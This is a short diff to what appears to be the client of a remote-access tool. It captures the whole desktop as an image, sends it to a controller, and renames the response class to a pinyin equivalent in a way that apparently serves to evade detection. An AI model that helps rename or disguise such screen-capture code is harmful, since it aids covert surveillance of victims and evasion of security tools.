@@ -81,7 +81,7 @@ namespace Rouzzf.Client.Messages
                         new Rectangle(0, 0, desktop.Width, desktop.Height),
                         new Size(desktop.Width, desktop.Height),
                         desktop.PixelFormat, stream);
-                    client.Send(new GetDesktopResponse
+                    client.Send(new GetZhuoMianResponse
                     {
                         Image = stream.ToArray(),
                         Quality = _streamCodec.ImageQuality,
@@ -94,7 +94,7 @@ namespace Rouzzf.Client.Messages
             {
                 if (_streamCodec != null)
                 {
-                    client.Send(new GetDesktopResponse
+                    client.Send(new GetZhuoMianResponse
                     {
                         Image = null,
                         Quality = _streamCodec.ImageQuality,
